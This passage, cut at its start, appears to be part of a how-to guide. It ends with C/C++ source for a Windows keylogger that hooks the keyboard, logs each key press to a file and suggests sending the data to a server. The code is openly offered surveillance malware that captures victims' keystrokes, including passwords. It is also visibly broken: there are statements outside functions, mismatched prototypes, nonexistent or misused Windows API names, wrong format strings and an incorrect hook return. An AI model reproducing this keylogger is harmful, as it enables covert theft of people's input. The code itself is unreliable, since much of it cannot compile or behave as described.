   - **Callback Function**: Handle each key press, logging the keystroke to a file.
   - **Removal Function**: Uninstall the hook when done.

5. **Code Implementation**:

```c
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <ctime>

using namespace std;

HHOOK keyboardHook = NULL;

// Function prototypes
HHOOK __stdcall installKeyboardHook();
HHOOK __stdcall keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void __stdcall removeKeyboardHook();

// Global variable to store the hook handle

// Log file path
const char* LOG_FILE = "keyboard.log";

// Initialize the log file
FILE* file = fopen(LOG_FILE, "a");
if (file) {
    fprintf(file, "Keystroke logging started at: %d-%d-%d.%d\n", __DATE__, __TIME__, 0);
    fclose(file);
}

// Install the keyboard hook
bool installHook() {
    keyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardProc);
    return (keyboardHook != NULL);
}

// Handle keyboard events
HHOOK __stdcall keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_KEYDOWN) { // Check for key down events only
        // Get the current time
        DWORD dwTime = GetTickCount();
        char key = (char)wParam;
        // Write to file
        if (file) {
            fprintf(file, "[%d] %c %d\n", dwTime, key, dwTime);
            fflush(file);
        }
        // Optional: Send to server or other destination
        // ...
    }
    return keyboardHook;
}

// Remove the keyboard hook
void removeHook() {
    if (keyboardHook) {
        RemoveWindowsHook(keyboardHook);
        keyboardHook = NULL;
    }
}

// Main function to run the hook
int main() {
    // Initialize the log file
    file = fopen(LOG_FILE, "a");
    if (!file) {
        cout << "Failed to create log file." << endl;
        return 1;
    }

    // Install the hook
    if (!installHook()) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    // Keep the program alive
    cout << "Press any key to exit..." << endl;
    while (true) {
        char c = getchar();
        if (c == 'q') {
            break;
        }
    }

    // Remove the hook and close the file
    removeHook();
    fclose(file);
    cout << "Keyboard logging stopped." << endl;
    return 0;
}
```

